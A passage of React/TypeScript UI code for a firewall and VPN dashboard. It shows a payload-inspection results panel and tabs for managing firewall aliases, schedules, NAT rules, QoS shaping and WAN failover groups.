              <button key={k} onClick={() => loadExample(k)}
                style={{ background:"#111", border:"1px solid #222", color:"#888", borderRadius:4, padding:"4px 10px", fontSize:10, fontFamily:"monospace", cursor:"pointer" }}>
                {v.label}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* ── Right: Results Panel ── */}
      <div>
        {!result && !loading && (
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:40, textAlign:"center" }}>
            <FlaskConical size={32} color="#1a1a1a" style={{ marginBottom:12 }}/>
            <p style={{ color:"#333", fontFamily:"monospace", fontSize:12 }}>Paste a payload and click Analyze to run the multi-layer inspection engine</p>
            <p style={{ color:"#222", fontSize:10, marginTop:8 }}>Detection layers: token scanning · obfuscation · structural analysis · 100+ WAF rules · Shannon entropy</p>
          </div>
        )}

        {loading && (
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:40, textAlign:"center" }}>
            <div style={{ fontSize:24, marginBottom:12, animation:"spin 1s linear infinite" }}>⟳</div>
            <p style={{ color:"#555", fontFamily:"monospace", fontSize:12 }}>Running detection layers…</p>
          </div>
        )}

        {result && vs && (
          <div>
            {/* Verdict card */}
            <div style={{ background: vs.bg, border:`2px solid ${vs.border}`, borderRadius:10, padding:18, marginBottom:12, boxShadow:`0 0 20px ${vs.glow}` }}>
              <div style={{ display:"flex", alignItems:"center", justifyContent:"space-between", marginBottom:12 }}>
                <div>
                  <div style={{ fontFamily:"monospace", fontSize:22, fontWeight:900, color: vs.text, letterSpacing:2, textTransform:"uppercase" }}>
                    {result.verdict === "malicious" ? "⛔ MALICIOUS" : result.verdict === "suspicious" ? "⚠ SUSPICIOUS" : "✓ CLEAN"}
                  </div>
                  <div style={{ color:"#555", fontSize:10, fontFamily:"monospace", marginTop:2 }}>
                    Language: <span style={{ color:"#888" }}>{result.detectedLanguage.toUpperCase()}</span> · Entropy: <span style={{ color:"#888" }}>{result.entropy}</span>
                  </div>
                </div>
                <div style={{ textAlign:"right" }}>
                  <div style={{ fontSize:28, fontWeight:900, fontFamily:"monospace", color: vs.text }}>{result.anomalyScore}</div>
                  <div style={{ fontSize:9, color:"#555", fontFamily:"monospace" }}>ANOMALY SCORE</div>
                </div>
              </div>

              {/* Confidence bar */}
              <div style={{ marginBottom:10 }}>
                <div style={{ display:"flex", justifyContent:"space-between", marginBottom:4 }}>
                  <span style={{ fontSize:9, color:"#555", fontFamily:"monospace" }}>CONFIDENCE</span>
                  <span style={{ fontSize:11, color: vs.text, fontFamily:"monospace", fontWeight:700 }}>{conf}%</span>
                </div>
                <div style={{ background:"#111", borderRadius:4, height:6, overflow:"hidden" }}>
                  <div style={{ width:`${conf}%`, height:"100%", background: vs.border, borderRadius:4, transition:"width 0.6s ease" }}/>
                </div>
              </div>

              {/* Signal summary */}
              <div style={{ display:"flex", gap:8, flexWrap:"wrap" }}>
                {[
                  { label:"Token Hits",   val: result.summary.tokenHits,   color:"#ff6600" },
                  { label:"Obfuscation",  val: result.summary.obfuscation,  color:"#cc44ff" },
                  { label:"Structural",   val: result.summary.structural,   color:"#4488ff" },
                  { label:"WAF Matches",  val: result.summary.wafMatches,   color:"#ff2244" },
                ].map(s => (
                  <div key={s.label} style={{ background:"#0a0a0a", borderRadius:6, padding:"6px 10px", textAlign:"center", flex:1 }}>
                    <div style={{ fontSize:16, fontWeight:900, fontFamily:"monospace", color: s.val > 0 ? s.color : "#333" }}>{s.val}</div>
                    <div style={{ fontSize:8, color:"#444", textTransform:"uppercase", letterSpacing:1 }}>{s.label}</div>
                  </div>
                ))}
              </div>

              {/* Threat categories */}
              {result.threatCategories.length > 0 && (
                <div style={{ marginTop:10, display:"flex", flexWrap:"wrap", gap:4 }}>
                  {result.threatCategories.map(c => (
                    <span key={c} style={{ background:"#ff224422", color:"#ff4466", border:"1px solid #ff224444", borderRadius:3, padding:"2px 7px", fontSize:9, fontFamily:"monospace", textTransform:"uppercase" }}>{c.replace(/_/g," ")}</span>
                  ))}
                </div>
              )}
            </div>

            {/* Recommendation */}
            <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:12, marginBottom:12 }}>
              <div style={{ fontFamily:"monospace", fontSize:10, color:"#444", marginBottom:6 }}>RECOMMENDED ACTION</div>
              <p style={{ margin:0, fontSize:11, color: vs.text, fontFamily:"monospace", lineHeight:1.5 }}>{result.recommendation}</p>
            </div>

            {/* Flagged tokens */}
            {result.flaggedTokens.length > 0 && (
              <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, marginBottom:12 }}>
                <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#ff6600", marginBottom:8 }}>
                  ⚡ Flagged Tokens ({result.flaggedTokens.length})
                </div>
                {result.flaggedTokens.map((t, i) => <TokenRow key={i} t={t} idx={i} />)}
              </div>
            )}

            <FlagSection title="🔐 Obfuscation Signals" items={result.obfuscationFlags} color="#cc44ff" />
            <FlagSection title="🏗 Structural / Behavioral" items={result.structuralFlags} color="#4488ff" />

            {/* WAF rule matches */}
            {result.wafRuleMatches.length > 0 && (
              <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, marginBottom:12 }}>
                <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#ff2244", marginBottom:8 }}>
                  🛡 WAF Rule Matches ({result.wafRuleMatches.length})
                </div>
                {result.wafRuleMatches.map((w, i) => (
                  <div key={i} style={{ display:"flex", gap:8, padding:"5px 0", borderBottom: i < result.wafRuleMatches.length-1 ? "1px solid #111" : "none", alignItems:"center" }}>
                    <span style={{ color: SEV_C[w.severity] ?? "#888", fontSize:9, fontFamily:"monospace", fontWeight:700, minWidth:60, textTransform:"uppercase" }}>{w.severity}</span>
                    <span style={{ color:"#ccc", fontSize:10, flex:1 }}>{w.name}</span>
                    <span style={{ color:"#444", fontSize:9, background:"#111", padding:"1px 5px", borderRadius:3 }}>{w.attackType}</span>
                  </div>
                ))}
              </div>
            )}

            {/* Raw JSON */}
            {showRaw && (
              <div style={{ background:"#050505", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
                <div style={{ fontFamily:"monospace", fontSize:10, color:"#333", marginBottom:6 }}>RAW JSON RESPONSE</div>
                <pre style={{ margin:0, fontSize:9, color:"#555", overflowX:"auto", maxHeight:300 }}>{JSON.stringify(result, null, 2)}</pre>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// ── NEW GAP-FILLING TABS (pfSense / OPNsense / IPFire / Snort / Suricata) ────
// ─────────────────────────────────────────────────────────────────────────────

// Shared helpers
const API = "/api/fw";
async function fwPost(path: string, body: unknown) {
  const r = await fetch(`${API}${path}`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) });
  return r.json();
}
async function fwPut(path: string, body: unknown) {
  const r = await fetch(`${API}${path}`, { method:"PUT", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) });
  return r.json();
}
async function fwDelete(path: string) {
  const r = await fetch(`${API}${path}`, { method:"DELETE" });
  return r.json();
}
function useFw<T>(path: string, dep?: unknown) {
  const [data, setData] = useState<T | null>(null);
  const [loading, setLoading] = useState(true);
  const load = useCallback(async () => {
    setLoading(true);
    try { const r = await fetch(`${API}${path}`); setData(await r.json()); } catch {}
    setLoading(false);
  }, [path]);
  useEffect(() => { void load(); }, [load, dep]);
  return { data, loading, reload: load };
}
function Spinner() { return <div style={{ color:"#444", fontFamily:"monospace", fontSize:11, padding:20 }}>Loading…</div>; }
function EmptyRow({ cols, msg }: { cols: number; msg: string }) {
  return <tr><td colSpan={cols} style={{ textAlign:"center", color:"#333", fontFamily:"monospace", fontSize:11, padding:20 }}>{msg}</td></tr>;
}
function TH({ children }: { children: React.ReactNode }) {
  return <th style={{ padding:"7px 10px", fontFamily:"monospace", fontSize:10, color:"#555", fontWeight:600, textAlign:"left", borderBottom:"1px solid #1a1a1a", whiteSpace:"nowrap" }}>{children}</th>;
}
function TD({ children, mono, c, style }: { children?: React.ReactNode; mono?: boolean; c?: string; style?: React.CSSProperties }) {
  return <td style={{ padding:"6px 10px", fontSize:11, color:c??"#ccc", fontFamily: mono?"monospace":"inherit", borderBottom:"1px solid #111", ...style }}>{children}</td>;
}
function CardBox({ title, children, action }: { title: string; children: React.ReactNode; action?: React.ReactNode }) {
  return (
    <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:20, marginBottom:16 }}>
      <div style={{ display:"flex", alignItems:"center", justifyContent:"space-between", marginBottom:14 }}>
        <span style={{ fontFamily:"monospace", fontSize:12, fontWeight:700, color:"#fff" }}>{title}</span>
        {action}
      </div>
      {children}
    </div>
  );
}
function FwInput(props: React.InputHTMLAttributes<HTMLInputElement>) {
  return <input {...props} style={{ background:"#111", border:"1px solid #222", borderRadius:4, padding:"5px 10px", color:"#ccc", fontFamily:"monospace", fontSize:11, outline:"none", ...(props.style??{}) }} />;
}
function FwSelect(props: React.SelectHTMLAttributes<HTMLSelectElement> & { children: React.ReactNode }) {
  return <select {...props} style={{ background:"#111", border:"1px solid #222", borderRadius:4, padding:"5px 10px", color:"#ccc", fontFamily:"monospace", fontSize:11, outline:"none", ...(props.style??{}) }}>{props.children}</select>;
}
function Btn({ onClick, children, color, sm, disabled }: { onClick: () => void; children: React.ReactNode; color?: string; sm?: boolean; disabled?: boolean }) {
  const bg = (color ?? "#00ff88") + "22";
  const bd = (color ?? "#00ff88") + "44";
  return (
    <button onClick={onClick} style={{ background:bg, border:`1px solid ${bd}`, color:color??"#00ff88", borderRadius:5, padding: sm?"3px 8px":"5px 12px", cursor:"pointer", fontFamily:"monospace", fontSize: sm?10:11 }}>
      {children}
    </button>
  );
}

// ── 1. ALIAS MANAGER ─────────────────────────────────────────────────────────
function AliasesTab() {
  const { data, loading, reload } = useFw<{ aliases: Array<{id:number;name:string;type:string;entries:string;description:string|null;hitCount:number;enabled:boolean}> }>("/aliases");
  const [form, setForm] = useState({ name:"", type:"host", entries:"", description:"" });
  const [saving, setSaving] = useState(false);

  const save = async () => {
    if (!form.name || !form.entries) return;
    setSaving(true);
    await fwPost("/aliases", form);
    setForm({ name:"", type:"host", entries:"", description:"" });
    await reload(); setSaving(false);
  };
  const seed = async () => { await fwPost("/aliases/seed", {}); await reload(); };

  const TYPE_COLOR: Record<string,string> = { host:"#00ff88", network:"#4488ff", port:"#ff9900", url_table:"#cc44ff", geo:"#ff4444" };

  return (
    <div>
      <CardBox title="🏷 Alias Manager — Named IP/Network/Port Groups (pfSense/OPNsense)" action={
        <div style={{ display:"flex", gap:8 }}>
          <Btn onClick={seed} color="#4488ff" sm>Seed Defaults</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>Create named reusable alias groups — host IPs, CIDRs, port ranges, or URL tables — that can be referenced by name in firewall rules instead of typing raw IPs every time. Identical to pfSense aliases.</p>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr 2fr auto", gap:8, marginBottom:12 }}>
          <FwInput placeholder="Alias name (e.g. ADMIN_IPS)" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} />
          <FwSelect value={form.type} onChange={e=>setForm(f=>({...f,type:e.target.value}))}>
            <option value="host">Host (IPs)</option>
            <option value="network">Network (CIDRs)</option>
            <option value="port">Port / Range</option>
            <option value="url_table">URL Table</option>
            <option value="geo">GeoIP Country</option>
          </FwSelect>
          <FwInput placeholder="Description (optional)" value={form.description} onChange={e=>setForm(f=>({...f,description:e.target.value}))} />
          <FwInput placeholder="Entries (one per line: 192.168.1.0/24, :80, etc.)" value={form.entries} onChange={e=>setForm(f=>({...f,entries:e.target.value}))} />
          <Btn onClick={save} color="#00ff88">{saving?"Saving…":"+ Add"}</Btn>
        </div>
        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Name</TH><TH>Type</TH><TH>Entries</TH><TH>Description</TH><TH>Hits</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.aliases?.length ? <EmptyRow cols={6} msg="No aliases defined. Click 'Seed Defaults' to pre-load useful groups."/> : data.aliases.map(a => (
                <tr key={a.id}>
                  <TD mono c="#00ff88">{a.name}</TD>
                  <TD><Bdg label={a.type} color={TYPE_COLOR[a.type]??"#888"} sm/></TD>
                  <TD mono c="#888">{a.entries.split("\n").slice(0,3).join(", ")}{a.entries.split("\n").length>3?` +${a.entries.split("\n").length-3} more`:""}</TD>
                  <TD c="#666">{a.description ?? "—"}</TD>
                  <TD mono c="#ff9900">{a.hitCount}</TD>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                    <div style={{ display:"flex", gap:4 }}>
                      <Btn onClick={async()=>{ await fwPost(`/aliases/${a.id}/resolve`,{}); await reload(); }} color="#4488ff" sm>Resolve</Btn>
                      <Btn onClick={async()=>{ await fwDelete(`/aliases/${a.id}`); await reload(); }} color="#ff4444" sm><Trash2 size={10}/></Btn>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
      <CardBox title="📘 How Aliases Work">
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr", gap:12 }}>
          {[
            { t:"Host Alias", d:"A list of individual IP addresses. Useful for admin workstations, trusted servers, or known-bad IPs. Example: 10.0.0.1, 10.0.0.2." },
            { t:"Network Alias", d:"One or more CIDR subnets. Example: 192.168.1.0/24, 10.8.0.0/16. Reference by name in source/dest fields of firewall rules." },
            { t:"Port Alias", d:"Port numbers or ranges. Example: 80, 443, 8080:8090. Use in destination port fields instead of repeating port lists across rules." },
            { t:"URL Table", d:"A remote URL that returns a newline-separated IP list. ProxhqVPN auto-fetches and updates this list on a schedule." },
            { t:"GeoIP Alias", d:"Named country codes (e.g. CN, RU, KP). ProxhqVPN resolves these to their CIDR ranges for blocking or allowing by geography." },
            { t:"Rule Reference", d:"Aliases appear anywhere you'd type an IP/port in rules. Write ADMIN_IPS as source instead of listing 20 IPs — the firewall expands them at match time." },
          ].map(card => (
            <div key={card.t} style={{ background:"#111", borderRadius:6, padding:12 }}>
              <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#00ff88", marginBottom:6 }}>{card.t}</div>
              <p style={{ margin:0, fontSize:11, color:"#666", lineHeight:1.6 }}>{card.d}</p>
            </div>
          ))}
        </div>
      </CardBox>
    </div>
  );
}

// ── 2. SCHEDULE-BASED RULES ──────────────────────────────────────────────────
function SchedulesTab() {
  const { data, loading, reload } = useFw<{ schedules: Array<{id:number;name:string;daysOfWeek:string;timeStart:string;timeEnd:string;timezone:string;enabled:boolean;isActive:boolean;description:string|null}> }>("/schedules");
  const [form, setForm] = useState({ name:"", daysOfWeek:"1,2,3,4,5", timeStart:"09:00", timeEnd:"17:00", timezone:"UTC", description:"" });
  const [saving, setSaving] = useState(false);

  const DAYS = ["Sun","Mon","Tue","Wed","Thu","Fri","Sat"];
  const dayLabel = (str: string) => str.split(",").map(d=>DAYS[parseInt(d)]??"?").join(", ");

  const save = async () => {
    if (!form.name) return;
    setSaving(true);
    await fwPost("/schedules", form);
    setForm({ name:"", daysOfWeek:"1,2,3,4,5", timeStart:"09:00", timeEnd:"17:00", timezone:"UTC", description:"" });
    await reload(); setSaving(false);
  };

  return (
    <div>
      <CardBox title="📅 Schedule-Based Firewall Rules (pfSense/OPNsense/IPFire)" action={<Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>}>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>Create named time schedules and bind them to firewall rules. Identical to pfSense schedules — block social media 9–5 on weekdays, allow gaming only on weekends, restrict downloads to off-peak hours.</p>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr 1fr 1fr 1fr auto", gap:8, marginBottom:12 }}>
          <FwInput placeholder="Schedule name" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} />
          <FwInput placeholder="Days (0=Sun,1=Mon…)" value={form.daysOfWeek} onChange={e=>setForm(f=>({...f,daysOfWeek:e.target.value}))} title="Comma-separated day numbers: 0=Sunday, 1=Monday, … 6=Saturday" />
          <FwInput type="time" value={form.timeStart} onChange={e=>setForm(f=>({...f,timeStart:e.target.value}))} />
          <FwInput type="time" value={form.timeEnd} onChange={e=>setForm(f=>({...f,timeEnd:e.target.value}))} />
          <FwInput placeholder="Timezone (e.g. UTC)" value={form.timezone} onChange={e=>setForm(f=>({...f,timezone:e.target.value}))} />
          <FwInput placeholder="Description" value={form.description} onChange={e=>setForm(f=>({...f,description:e.target.value}))} />
          <Btn onClick={save} color="#00ff88">{saving?"Saving…":"+ Add"}</Btn>
        </div>
        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Name</TH><TH>Days</TH><TH>Time Window</TH><TH>Timezone</TH><TH>Status</TH><TH>Description</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.schedules?.length ? <EmptyRow cols={7} msg="No schedules defined yet."/> : data.schedules.map(s => (
                <tr key={s.id}>
                  <TD mono c="#ff9900">{s.name}</TD>
                  <TD c="#888">{dayLabel(s.daysOfWeek)}</TD>
                  <TD mono c="#ccc">{s.timeStart} – {s.timeEnd}</TD>
                  <TD mono c="#666">{s.timezone}</TD>
                  <TD><Bdg label={s.isActive?"ACTIVE":"INACTIVE"} color={s.isActive?"#00ff88":"#333"} sm/></TD>
                  <TD c="#555">{s.description ?? "—"}</TD>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                    <div style={{ display:"flex", gap:4 }}>
                      <Btn onClick={async()=>{ await fwPut(`/schedules/${s.id}`,{enabled:!s.enabled}); await reload(); }} color={s.enabled?"#ff9900":"#00ff88"} sm>{s.enabled?"Disable":"Enable"}</Btn>
                      <Btn onClick={async()=>{ await fwDelete(`/schedules/${s.id}`); await reload(); }} color="#ff4444" sm><Trash2 size={10}/></Btn>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
      <CardBox title="⏰ Schedule Examples">
        <div style={{ display:"grid", gridTemplateColumns:"repeat(3,1fr)", gap:10 }}>
          {[
            { name:"Business Hours Block", days:"Mon–Fri", time:"09:00–17:00", use:"Block social media, gaming sites, video streaming on corporate networks during work hours." },
            { name:"Weekend Gaming",       days:"Sat–Sun", time:"All day",    use:"Allow gaming traffic only on weekends. Bind to a firewall rule that allows high-bandwidth game server IPs." },
            { name:"Off-Peak Backup",      days:"Daily",   time:"02:00–05:00",use:"Allow large transfers and backup jobs only in the early morning hours to avoid congesting the network." },
            { name:"After-Hours Admin",    days:"Mon–Fri", time:"18:00–23:59",use:"Restrict remote admin access (SSH/RDP) to after business hours to reduce attack surface during peak vulnerability windows." },
            { name:"Kids Screen Time",     days:"Sat–Sun", time:"10:00–20:00",use:"Allow kids' device alias access to entertainment/gaming sites only during permitted weekend hours." },
            { name:"Update Window",        days:"Tue",     time:"03:00–04:00",use:"Allow outbound connections to OS update servers only on Patch Tuesday at 3am to control update timing." },
          ].map(ex => (
            <div key={ex.name} style={{ background:"#111", borderRadius:6, padding:12 }}>
              <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#ff9900", marginBottom:4 }}>{ex.name}</div>
              <div style={{ fontSize:10, color:"#4488ff", marginBottom:6 }}>{ex.days} · {ex.time}</div>
              <p style={{ margin:0, fontSize:11, color:"#666", lineHeight:1.5 }}>{ex.use}</p>
            </div>
          ))}
        </div>
      </CardBox>
    </div>
  );
}

// ── 3. NAT / PORT FORWARDING ─────────────────────────────────────────────────
function NatTab() {
  const { data, loading, reload } = useFw<{ rules: Array<{id:number;name:string;natType:string;protocol:string;interface:string;destPort:string|null;natIp:string;natPort:string|null;enabled:boolean;hitCount:number;description:string|null}> }>("/nat");
  const [form, setForm] = useState({ name:"", natType:"port_forward", protocol:"tcp", interface:"WAN", destPort:"", natIp:"", natPort:"", description:"" });
  const [saving, setSaving] = useState(false);

  const NAT_COLOR: Record<string,string> = { port_forward:"#00ff88", nat_1to1:"#4488ff", outbound:"#ff9900", npt:"#cc44ff" };

  const save = async () => {
    if (!form.name || !form.natIp) return;
    setSaving(true);
    await fwPost("/nat", form);
    setForm({ name:"", natType:"port_forward", protocol:"tcp", interface:"WAN", destPort:"", natIp:"", natPort:"", description:"" });
    await reload(); setSaving(false);
  };
  const getScript = async () => {
    const r = await fetch(`${API}/nat/generate-iptables`);
    const text = await r.text();
    const blob = new Blob([text], { type:"text/plain" });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement("a"); a.href=url; a.download="nat-rules.sh"; a.click();
  };

  return (
    <div>
      <CardBox title="🔀 NAT / Port Forwarding Rules (pfSense/OPNsense)" action={
        <div style={{ display:"flex", gap:8 }}>
          <Btn onClick={getScript} color="#4488ff" sm><Download size={10}/> iptables Script</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          Configure NAT rules: Port Forwarding (expose an internal service on WAN), 1:1 NAT (map a WAN IP 1:1 to an internal host), Outbound NAT (masquerade internal traffic), and NPt (IPv6 prefix translation).
        </p>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr 1fr 1fr 1fr 1fr auto", gap:6, marginBottom:12 }}>
          <FwInput placeholder="Rule name" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} />
          <FwSelect value={form.natType} onChange={e=>setForm(f=>({...f,natType:e.target.value}))}>
            <option value="port_forward">Port Forward</option>
            <option value="nat_1to1">1:1 NAT</option>
            <option value="outbound">Outbound NAT</option>
            <option value="npt">NPt (IPv6)</option>
          </FwSelect>
          <FwSelect value={form.protocol} onChange={e=>setForm(f=>({...f,protocol:e.target.value}))}>
            <option>tcp</option><option>udp</option><option>tcp/udp</option><option>any</option>
          </FwSelect>
          <FwInput placeholder="Interface (WAN)" value={form.interface} onChange={e=>setForm(f=>({...f,interface:e.target.value}))} />
          <FwInput placeholder="Ext. port (e.g. 8080)" value={form.destPort} onChange={e=>setForm(f=>({...f,destPort:e.target.value}))} />
          <FwInput placeholder="Internal IP" value={form.natIp} onChange={e=>setForm(f=>({...f,natIp:e.target.value}))} />
          <FwInput placeholder="Internal port" value={form.natPort} onChange={e=>setForm(f=>({...f,natPort:e.target.value}))} />
          <Btn onClick={save} color="#00ff88">{saving?"Saving…":"+ Add"}</Btn>
        </div>
        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Name</TH><TH>Type</TH><TH>Proto</TH><TH>Interface</TH><TH>Ext Port</TH><TH>→ Internal</TH><TH>Hits</TH><TH>Status</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.rules?.length ? <EmptyRow cols={9} msg="No NAT rules defined yet."/> : data.rules.map(r => (
                <tr key={r.id}>
                  <TD c="#fff">{r.name}</TD>
                  <TD><Bdg label={r.natType.replace("_"," ")} color={NAT_COLOR[r.natType]??"#888"} sm/></TD>
                  <TD mono c="#ff9900">{r.protocol}</TD>
                  <TD mono c="#888">{r.interface}</TD>
                  <TD mono c="#ccc">{r.destPort ?? "any"}</TD>
                  <TD mono c="#00ff88">{r.natIp}{r.natPort?`:${r.natPort}`:""}</TD>
                  <TD mono c="#ff9900">{r.hitCount}</TD>
                  <TD><Bdg label={r.enabled?"ON":"OFF"} color={r.enabled?"#00ff88":"#444"} sm/></TD>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                    <div style={{ display:"flex", gap:4 }}>
                      <Btn onClick={async()=>{ await fwPut(`/nat/${r.id}`,{enabled:!r.enabled}); await reload(); }} color={r.enabled?"#ff9900":"#00ff88"} sm>{r.enabled?"Off":"On"}</Btn>
                      <Btn onClick={async()=>{ await fwDelete(`/nat/${r.id}`); await reload(); }} color="#ff4444" sm><Trash2 size={10}/></Btn>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
    </div>
  );
}

// ── 4. QoS / TRAFFIC SHAPING ─────────────────────────────────────────────────
function QosTab() {
  const { data, loading, reload } = useFw<{ rules: Array<{id:number;name:string;description:string|null;direction:string;protocol:string;destPort:string|null;action:string;bandwidthKbps:number|null;burstKbps:number|null;priority:number;enabled:boolean;hitCount:number}> }>("/qos");
  const [form, setForm] = useState({ name:"", direction:"both", protocol:"any", destPort:"", action:"limit", bandwidthKbps:"", priority:"5", description:"" });
  const [saving, setSaving] = useState(false);

  const ACTION_COLOR: Record<string,string> = { limit:"#ff9900", priority:"#00ff88", guarantee:"#4488ff", drop:"#ff4444" };
  const PRIO_LABEL = ["","Highest","High","Med-High","Medium","Normal","Med-Low","Low","Lowest"];

  const save = async () => {
    if (!form.name) return;
    setSaving(true);
    await fwPost("/qos", { ...form, bandwidthKbps: form.bandwidthKbps?parseInt(form.bandwidthKbps):undefined, priority:parseInt(form.priority) });
    setForm({ name:"", direction:"both", protocol:"any", destPort:"", action:"limit", bandwidthKbps:"", priority:"5", description:"" });
    await reload(); setSaving(false);
  };
  const getTcScript = async () => {
    const r = await fetch(`${API}/qos/generate-tc`);
    const text = await r.text();
    const blob = new Blob([text], { type:"text/plain" });
    const a = document.createElement("a"); a.href=URL.createObjectURL(blob); a.download="qos-tc.sh"; a.click();
  };

  return (
    <div>
      <CardBox title="📊 Traffic Shaping / QoS Rules (pfSense/OPNsense/IPFire)" action={
        <div style={{ display:"flex", gap:8 }}>
          <Btn onClick={async()=>{await fwPost("/qos/seed",{}); await reload();}} color="#4488ff" sm>Seed Defaults</Btn>
          <Btn onClick={getTcScript} color="#cc44ff" sm><Download size={10}/> tc Script</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          Control bandwidth allocation with hierarchical token-bucket shaping. Limit P2P, prioritize VoIP/video calls, guarantee SSH management bandwidth. Generates Linux tc (traffic control) HFSC/HTB scripts.
        </p>
        <div style={{ display:"grid", gridTemplateColumns:"1.5fr 1fr 1fr 1fr 1fr 1fr 1fr auto", gap:6, marginBottom:12 }}>
          <FwInput placeholder="Rule name" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} />
          <FwSelect value={form.direction} onChange={e=>setForm(f=>({...f,direction:e.target.value}))}>
            <option value="inbound">Inbound</option><option value="outbound">Outbound</option><option value="both">Both</option>
          </FwSelect>
          <FwSelect value={form.action} onChange={e=>setForm(f=>({...f,action:e.target.value}))}>
            <option value="limit">Limit Bandwidth</option>
            <option value="priority">Prioritize</option>
            <option value="guarantee">Guarantee</option>
            <option value="drop">Drop Excess</option>
          </FwSelect>
          <FwInput placeholder="Max Kbps (e.g. 2048)" value={form.bandwidthKbps} onChange={e=>setForm(f=>({...f,bandwidthKbps:e.target.value}))} />
          <FwInput placeholder="Dest port/range" value={form.destPort} onChange={e=>setForm(f=>({...f,destPort:e.target.value}))} />
          <FwSelect value={form.priority} onChange={e=>setForm(f=>({...f,priority:e.target.value}))}>
            {PRIO_LABEL.slice(1).map((l,i)=><option key={i+1} value={i+1}>{i+1} — {l}</option>)}
          </FwSelect>
          <FwInput placeholder="Description" value={form.description} onChange={e=>setForm(f=>({...f,description:e.target.value}))} />
          <Btn onClick={save} color="#00ff88">{saving?"Saving…":"+ Add"}</Btn>
        </div>
        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Name</TH><TH>Dir</TH><TH>Action</TH><TH>Bandwidth</TH><TH>Port</TH><TH>Priority</TH><TH>Hits</TH><TH>Status</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.rules?.length ? <EmptyRow cols={9} msg="No QoS rules yet. Click 'Seed Defaults' to load VoIP/P2P/SSH presets."/> : data.rules.map(r=>(
                <tr key={r.id}>
                  <TD c="#fff">{r.name}</TD>
                  <TD mono c="#888">{r.direction}</TD>
                  <TD><Bdg label={r.action} color={ACTION_COLOR[r.action]??"#888"} sm/></TD>
                  <TD mono c="#ff9900">{r.bandwidthKbps ? `${r.bandwidthKbps} Kbps` : "—"}</TD>
                  <TD mono c="#ccc">{r.destPort ?? "any"}</TD>
                  <TD mono c="#4488ff">{r.priority} — {PRIO_LABEL[r.priority]??""}</TD>
                  <TD mono c="#ff9900">{r.hitCount}</TD>
                  <TD><Bdg label={r.enabled?"ON":"OFF"} color={r.enabled?"#00ff88":"#444"} sm/></TD>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                    <div style={{ display:"flex", gap:4 }}>
                      <Btn onClick={async()=>{await fwPut(`/qos/${r.id}`,{enabled:!r.enabled}); await reload();}} color={r.enabled?"#ff9900":"#00ff88"} sm>{r.enabled?"Off":"On"}</Btn>
                      <Btn onClick={async()=>{await fwDelete(`/qos/${r.id}`); await reload();}} color="#ff4444" sm><Trash2 size={10}/></Btn>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
    </div>
  );
}

// ── 5. WAN LOAD BALANCING / FAILOVER ─────────────────────────────────────────
function WanGroupsTab() {
  const { data, loading, reload } = useFw<{ groups: Array<{id:number;name:string;mode:string;interfaces:string;triggerLevel:string;enabled:boolean;description:string|null}> }>("/wan-groups");
  const [form, setForm] = useState({ name:"", mode:"failover", interfaces:'[{"iface":"eth0","gateway":"192.168.1.1","weight":1,"priority":1}]', triggerLevel:"packetloss", description:"" });
  const [saving, setSaving] = useState(false);
